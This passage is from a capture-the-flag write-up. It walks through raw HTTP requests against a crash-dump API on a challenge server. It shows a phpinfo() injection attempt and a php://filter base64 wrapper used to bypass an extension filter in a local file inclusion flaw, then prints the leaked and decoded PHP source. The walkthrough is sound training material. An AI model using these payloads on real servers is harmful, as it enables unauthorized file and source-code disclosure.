class="s2">&quot;119010712&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapszlimit&quot;</span><span class="p">:</span><span class="s2">&quot;536870912&quot;</span><span class="p">,</span><span class="nt">&quot;natallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;7198792&quot;</span><span class="p">,</span><span class="nt">&quot;cpuusage&quot;</span><span class="p">:</span><span class="s2">&quot;0.08108108&quot;</span><span class="p">,</span><span class="nt">&quot;totalstor&quot;</span><span class="p">:</span><span class="s2">&quot;1560133632&quot;</span><span class="p">,</span><span class="nt">&quot;freestor&quot;</span><span class="p">:</span><span class="s2">&quot;120262656&quot;</span><span class="p">,</span><span class="nt">&quot;busystor&quot;</span><span class="p">:</span><span class="s2">&quot;1439870976&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:27:39 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">81</span>

{
    &quot;success&quot; : true,
    &quot;folder&quot; : &quot;docs&quot;,
    &quot;crashdump&quot; : &quot;crashdump-yoerjb.php&quot;
}
</pre></div>
<div class="highlight"><pre><span class="nf">GET</span> <span class="nn">/docs/crashdump-yoerjb.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:28:33 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">488</span>

{
    &quot;message&quot;: &quot;<span class="cp">&lt;?php phpinfo(); ?&gt;</span>&quot;,
    &quot;lmessage&quot;: &quot;Message.&quot;,
    &quot;strace&quot;: &quot;Stack trace&quot;,
    &quot;sdkint&quot;: &quot;25&quot;,
    &quot;device&quot;: &quot;generic_x86&quot;,
    &quot;product&quot;: &quot;sdk_google_phone_x86&quot;,
    &quot;lversion&quot;: &quot;3.10.0+&quot;,
    &quot;vmheapsz&quot;: &quot;123054440&quot;,
    &quot;vmallocmem&quot;: &quot;119010712&quot;,
    &quot;vmheapszlimit&quot;: &quot;536870912&quot;,
    &quot;natallocmem&quot;: &quot;7198792&quot;,
    &quot;cpuusage&quot;: &quot;0.08108108&quot;,
    &quot;totalstor&quot;: &quot;1560133632&quot;,
    &quot;freestor&quot;: &quot;120262656&quot;,
    &quot;busystor&quot;: &quot;1439870976&quot;,
    &quot;udid&quot;: &quot;58bc60a3ff0f2f1a&quot;
}
</pre></div>
<p>No such luck, our code was not executed. By playing with other parameters, I
got this error message when I modified the <code>operation</code> parameter:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">419</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;Test&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><span class="p">,</span><span class="nt">&quot;lmessage&quot;</span><span class="p">:</span><span class="s2">&quot;Message.&quot;</span><span class="p">,</span><span class="nt">&quot;strace&quot;</span><span class="p">:</span><span class="s2">&quot;Stack trace&quot;</span><span class="p">,</span><span class="nt">&quot;sdkint&quot;</span><span class="p">:</span><span class="s2">&quot;25&quot;</span><span class="p">,</span><span class="nt">&quot;device&quot;</span><span class="p">:</span><span class="s2">&quot;generic_x86&quot;</span><span class="p">,</span><span class="nt">&quot;product&quot;</span><span class="p">:</span><span class="s2">&quot;sdk_google_phone_x86&quot;</span><span class="p">,</span><span class="nt">&quot;lversion&quot;</span><span class="p">:</span><span class="s2">&quot;3.10.0+&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapsz&quot;</span><span class="p">:</span><span class="s2">&quot;123054440&quot;</span><span class="p">,</span><span class="nt">&quot;vmallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;119010712&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapszlimit&quot;</span><span class="p">:</span><span class="s2">&quot;536870912&quot;</span><span class="p">,</span><span class="nt">&quot;natallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;7198792&quot;</span><span class="p">,</span><span class="nt">&quot;cpuusage&quot;</span><span class="p">:</span><span class="s2">&quot;0.08108108&quot;</span><span class="p">,</span><span class="nt">&quot;totalstor&quot;</span><span class="p">:</span><span class="s2">&quot;1560133632&quot;</span><span class="p">,</span><span class="nt">&quot;freestor&quot;</span><span class="p">:</span><span class="s2">&quot;120262656&quot;</span><span class="p">,</span><span class="nt">&quot;busystor&quot;</span><span class="p">:</span><span class="s2">&quot;1439870976&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:30:29 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">82</span>

Fatal error! JSON key &#39;operation&#39; must be set to WriteCrashDump or ReadCrashDump.
</pre></div>
<p>Ok, so we can create crash dump file, but we can also read from them. Let's try
to read one. Since I don't know how this API function works, I tried creating
a valid <code>ReadCrashDump</code> request by trial and error:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">29</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:33:00 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">42</span>

Fatal error! JSON key &#39;data&#39; must be set.
</pre></div>
<p>Alright, a <code>data</code> key must be set. Let's try this:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">40</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">,</span> <span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:34:02 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">47</span>

Fatal error! JSON key &#39;crashdump&#39; must be set.
</pre></div>
<p>Ok, we now need a <code>crashdump</code> key. Let's add it:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">57</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">,</span> <span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nt">&quot;crashdump&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:35:03 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">47</span>

Fatal error! JSON key &#39;crashdump&#39; must be set.
</pre></div>
<p>Hmm, the server does not seem to like where we put our <code>crashdump</code> key.
Maybe we should put it in the <code>data</code> object?</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">56</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">,</span> <span class="nt">&quot;data&quot;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&quot;crashdump&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> <span class="ne">Internal Server Error</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:36:09 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<p>Alright, we got a 500 error. Our syntax seems to be correct, but the server
generated an error, probably because we didn't put anything in the
<code>crashdump</code> key. Let's try to put one of our file:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">76</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">,</span> <span class="nt">&quot;data&quot;</span> <span class="p">:{</span><span class="nt">&quot;crashdump&quot;</span><span class="p">:</span> <span class="s2">&quot;crashdump-yoerjb.php&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:38:36 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">66</span>

Fatal error! crashdump value duplicate &#39;.php&#39; extension detected.
</pre></div>
<p>We got a &quot;fatal error&quot;, but the web server returned a 200 OK code. This
probably means that we encountered an application error, but not an HTTP error.
The error message looks like there is custom filtering on the <code>crashdump</code>
parameter. Filtering on <code>.php</code> extensions seems like a filter against
Local File Inclusion. The <code>crashdump</code> parameter is most likely used to
include one of the created crash dump file.</p>
<p>Since <code>.php</code> extensions seem to be filtered, this LFI seems a good
candidate for <a class="reference external" href="http://php.net/manual/en/wrappers.php.php">PHP wrappers</a>. PHP
wrappers are URL starting with <code>php://</code>. They can be used to access
different I/O streams, and work on them directly. One of these wrappers, and
a very interesting one in the case of an LFI is the
<a class="reference external" href="http://php.net/manual/en/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-unknown-unknown-unknown-descriptiot">filter</a>
wrapper. The <code>filter</code> wrapper can be used to manipulate files present on
the file system, and transform them (base64-encode, ROT13-encode, etc.). Since
the server seems to append <code>.php</code> automatically to the <code>crashdump</code>
parameter (cue the error message), we can use a <code>php://filter</code> to read
files from the server, such as source code file. Let's try to read the
<code>exception.php</code> file:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">112</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">,</span> <span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;crashdump&quot;</span><span class="p">:</span><span class="s2">&quot;php://filter/read=convert.base64-encode/resource=exception&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 15:53:25 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3168</span>

PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDogZGlzY29tYm9idWxhdGVkLWF1ZGlvLTYtWHl6RTNOOVlxS05ILm1wMwoKIyBDb2RlIGZyb20gaHR0cDovL3RoaXNpbnRlcmVzdHNtZS5jb20vcmVjZWl2aW5nLWpzb24tcG9zdC1kYXRhLXZpYS1waHAvCiMgTWFrZSBzdXJlIHRoYXQgaXQgaXMgYSBQT1NUIHJlcXVlc3QuCmlmKHN0cmNhc2VjbXAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10sICdQT1NUJykgIT0gMCl7CiAgICBkaWUoIlJlcXVlc3QgbWV0aG9kIG11c3QgYmUgUE9TVFxuIik7Cn0KCSAKIyBNYWtlIHN1cmUgdGhhdCB0aGUgY29udGVudCB0eXBlIG9mIHRoZSBQT1NUIHJlcXVlc3QgaGFzIGJlZW4gc2V0IHRvIGFwcGxpY2F0aW9uL2pzb24KJGNvbnRlbnRUeXBlID0gaXNzZXQoJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA/IHRyaW0oJF9TRVJWRVJbIkNPTlRFTlRfVFlQRSJdKSA6ICcnOwppZihzdHJjYXNlY21wKCRjb250ZW50VHlwZSwgJ2FwcGxpY2F0aW9uL2pzb24nKSAhPSAwKXsKICAgIGRpZSgiQ29udGVudCB0eXBlIG11c3QgYmU6IGFwcGxpY2F0aW9uL2pzb25cbiIpOwp9CgkKIyBHcmFiIHRoZSByYXcgUE9TVC4gTmVjZXNzYXJ5IGZvciBKU09OIGluIHBhcnRpY3VsYXIuCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRvYmogPSBqc29uX2RlY29kZSgkY29udGVudCwgdHJ1ZSk7CgkjIElmIGpzb25fZGVjb2RlIGZhaWxlZCwgdGhlIEpTT04gaXMgaW52YWxpZC4KaWYoIWlzX2FycmF5KCRvYmopKXsKICAgIGRpZSgiUE9TVCBjb250YWlucyBpbnZhbGlkIEpTT04hXG4iKTsKfQoKIyBQcm9jZXNzIHRoZSBKU09OLgppZiAoICEgaXNzZXQoICRvYmpbJ29wZXJhdGlvbiddKSBvciAoCgkkb2JqWydvcGVyYXRpb24nXSAhPT0gIldyaXRlQ3Jhc2hEdW1wIiBhbmQKCSRvYmpbJ29wZXJhdGlvbiddICE9PSAiUmVhZENyYXNoRHVtcCIpKQoJewoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ29wZXJhdGlvbicgbXVzdCBiZSBzZXQgdG8gV3JpdGVDcmFzaER1bXAgb3IgUmVhZENyYXNoRHVtcC5cbiIpOwp9CmlmICggaXNzZXQoJG9ialsnZGF0YSddKSkgewoJaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiV3JpdGVDcmFzaER1bXAiKSB7CgkJIyBXcml0ZSBhIG5ldyBjcmFzaCBkdW1wIHRvIGRpc2sKCQlwcm9jZXNzQ3Jhc2hEdW1wKCRvYmpbJ2RhdGEnXSk7Cgl9CgllbHNlaWYgKCRvYmpbJ29wZXJhdGlvbiddID09PSAiUmVhZENyYXNoRHVtcCIpIHsKCQkjIFJlYWQgYSBjcmFzaCBkdW1wIGJhY2sgZnJvbSBkaXNrCgkJcmVhZENyYXNoZHVtcCgkb2JqWydkYXRhJ10pOwoJfQp9CmVsc2UgewoJIyBkYXRhIGtleSB1bnNldAoJZGllKCJGYXRhbCBlcnJvciEgSlNPTiBrZXkgJ2RhdGEnIG11c3QgYmUgc2V0LlxuIik7Cn0KZnVuY3Rpb24gcHJvY2Vzc0NyYXNoZHVtcCgkY3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7Cgkkb3V0cHV0ZmlsZW5hbWUgPSB0ZW1wbmFtKCRiYXNlcGF0aCwgImNyYXNoZHVtcC0iKTsKCXVubGluaygkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkb3V0cHV0ZmlsZW5hbWUgPSAkb3V0cHV0ZmlsZW5hbWUgLiAiLnBocCI7CgkkYmFzZW5hbWUgPSBiYXNlbmFtZSgkb3V0cHV0ZmlsZW5hbWUpOwoJCgkkY3Jhc2hkdW1wX2VuY29kZWQgPSAiPD9waHAgcHJpbnQoJyIgLiBqc29uX2VuY29kZSgkY3Jhc2hkdW1wLCBKU09OX1BSRVRUWV9QUklOVCkgLiAiJyk7IjsKCWZpbGVfcHV0X2NvbnRlbnRzKCRvdXRwdXRmaWxlbmFtZSwgJGNyYXNoZHVtcF9lbmNvZGVkKTsKCQkJCglwcmludCA8PDxFTkQKewoJInN1Y2Nlc3MiIDogdHJ1ZSwKCSJmb2xkZXIiIDogImRvY3MiLAoJImNyYXNoZHVtcCIgOiAiJGJhc2VuYW1lIgp9CgpFTkQ7Cn0KZnVuY3Rpb24gcmVhZENyYXNoZHVtcCgkcmVxdWVzdGVkQ3Jhc2hkdW1wKSB7CgkkYmFzZXBhdGggPSAiL3Zhci93d3cvaHRtbC9kb2NzLyI7CgljaGRpcigkYmFzZXBhdGgpOwkJCgkKCWlmICggISBpc3NldCgkcmVxdWVzdGVkQ3Jhc2hkdW1wWydjcmFzaGR1bXAnXSkpIHsKCQlkaWUoIkZhdGFsIGVycm9yISBKU09OIGtleSAnY3Jhc2hkdW1wJyBtdXN0IGJlIHNldC5cbiIpOwoJfQoKCWlmICggc3Vic3RyKHN0cnJjaHIoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10sICIuIiksIDEpID09PSAicGhwIiApIHsKCQlkaWUoIkZhdGFsIGVycm9yISBjcmFzaGR1bXAgdmFsdWUgZHVwbGljYXRlICcucGhwJyBleHRlbnNpb24gZGV0ZWN0ZWQuXG4iKTsKCX0KCWVsc2UgewoJCXJlcXVpcmUoJHJlcXVlc3RlZENyYXNoZHVtcFsnY3Jhc2hkdW1wJ10gLiAnLnBocCcpOwoJfQkKfQoKPz4K
</pre></div>
<p>Yes! We managed to get the source code of the <code>exception.php</code> page,
encoded in base64. By decoding it, we have access to the source code, and we
can see how our data are treated:</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>

<span class="hll"><span class="c1"># Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3</span>
</span>
<span class="c1"># Code from http://thisinterestsme.com/receiving-json-post-data-via-php/</span>
<span class="c1"># Make sure that it is a POST request.</span>
<span class="k">if</span><span class="p">(</span><span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">],</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Request method must be POST</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># Make sure that the content type of the POST request has been set to application/json</span>
<span class="nv">$contentType</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;CONTENT_TYPE&quot;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;CONTENT_TYPE&quot;</span><span class="p">])</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$contentType</span><span class="p">,</span> <span class="s1">&#39;application/json&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Content type must be: application/json</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># Grab the raw POST. Necessary for JSON in particular.</span>
<span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;php://input&quot;</span><span class="p">);</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
    <span class="c1"># If json_decode failed, the JSON is invalid.</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;POST contains invalid JSON!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1"># Process the JSON.</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;operation&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="p">(</span>
    <span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;operation&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&quot;WriteCrashDump&quot;</span> <span class="k">and</span>
    <span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;operation&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">))</span>
    <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Fatal error! JSON key &#39;operation&#39; must be set to WriteCrashDump or ReadCrashDump.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;operation&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;WriteCrashDump&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1"># Write a new crash dump to disk</span>
        <span class="nx">processCrashDump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;operation&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;ReadCrashDump&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1"># Read a crash dump back from disk</span>
        <span class="nx">readCrashdump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="c1"># data key unset</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Fatal error! JSON key &#39;data&#39; must be set.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">processCrashdump</span><span class="p">(</span><span class="nv">$crashdump</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$basepath</span> <span class="o">=</span> <span class="s2">&quot;/var/www/html/docs/&quot;</span><span class="p">;</span>
